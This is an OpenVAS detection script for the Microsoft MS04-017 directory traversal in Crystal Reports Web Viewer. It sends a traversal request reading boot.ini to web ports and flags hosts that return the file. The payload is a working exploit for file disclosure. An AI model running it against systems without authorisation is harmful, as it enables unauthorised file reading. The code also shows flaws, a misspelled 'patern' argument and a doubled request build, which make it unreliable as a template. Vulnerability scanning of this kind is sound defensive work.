# OpenVAS Vulnerability Test
# $Id: remote-MS04-017.nasl 15 2013-10-27 12:49:54Z jan $
# Description: 
# Microsoft Security Bulletin MS04-017
# Vulnerability in Crystal Reports Web Viewer Could Allow Information Disclosure and Denial of Service 
#
# Affected Software
# Visual Studio .NET 2003 
# Outlook 2003 with Business Contact Manager 
# Microsoft Business Solutions CRM 1.2 
#
# Non-Affected Software:
# All other supported versions of Visual Studio, Outlook, and Microsoft Business Solutions CRM.
#
# remote-detect-MS04-017.nasl
#
# Author:
# Christian Eric Edjenguele <christian.edjenguele@owasp.org>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2 or later,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "A directory traversal vulnerability exists in Crystal Reports and Crystal Enterprise from Business Objects 
that could allow Information Disclosure and Denial of Service attacks on an affected system. 
An attacker who successfully exploited the vulnerability could retrieve and delete files through the Crystal Reports 
and Crystal Enterprise Web interface on an affected system.";

tag_solution = "Microsoft has released a patch to fix this issue, download it from the following website: 
http://www.microsoft.com/technet/security/bulletin/ms04-017.mspx

Visual Studio .NET 2003: 
http://www.microsoft.com/downloads/details.aspx?FamilyId=659CA40E-808D-431D-A7D3-33BC3ACE922D&displaylang=en
Outlook 2003 with Business Contact Manager: 
http://www.microsoft.com/downloads/details.aspx?FamilyId=9016B9F3-BA86-4A95-9D89-E120EF2E85E3&displaylang=en
Microsoft Business Solutions CRM 1.2: 
http://go.microsoft.com/fwlink/?LinkId=30127";


 

 
 if(description)
{
script_id(101004);
script_version("$Revision: 15 $");
script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
script_tag(name:"creation_date", value:"2009-03-15 20:59:49 +0100 (Sun, 15 Mar 2009)");
script_tag(name:"cvss_base", value:"7.5");
script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
script_tag(name:"risk_factor", value:"High");
script_bugtraq_id(10260);
script_cve_id("CVE-2004-0204");
name = "Microsoft MS04-017 security check";
script_name(name);
 
desc = "
Summary:
" + tag_summary + "
Solution:
" + tag_solution;

script_description(desc);

summary = "Vulnerability in Crystal Reports Web Viewer Could Allow Information Disclosure and Denial of Service";

script_summary(summary);

script_category(ACT_ATTACK);

script_copyright("Christian Eric Edjenguele <christian.edjenguele@owasp.org>");
family = "Windows : Microsoft Bulletins";
script_family(family);
script_dependencies("find_service.nasl");
script_require_ports("Services/www");


 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");


crystal_reports = get_kb_list("Services/www");

pages  = make_list('/CrystalReportWebFormViewer',
             '/CrystalReportWebFormViewer2',
             '/crystalreportViewers');


# get the target ip address
h_ip = get_host_ip();


# connect to the remote host
foreach port (crystal_reports)
{
	# Build the malicious request
	foreach page (pages)
	{
		soc = open_sock_tcp(port);
                if(soc)
                {
		  # build the malicious request
		  request = page + '/crystalimagehandler.aspx?dynamicimage=../../../../../../../../../boot.ini';
		
		  qry = string('GET ' + request + ' HTTP/1.0\r\n',
 		  	       'Host: ' + h_ip + ':' + port + '\r\n\r\n');
		
		  req = http_get(item:qry, port:port);
		  send(socket:soc, data: req);

		  # Get back the response
		  reply = recv(socket:soc, length:4096);

		  close(soc);
                }

		if(reply)
		{
			header_server = egrep(patern:"Server", string:reply, icase:TRUE);
			
			if(("Microsoft-IIS" >< header_server ) && ( '[boot loader]' >< reply)) 
				security_hole(port);
			
		}
	}
}
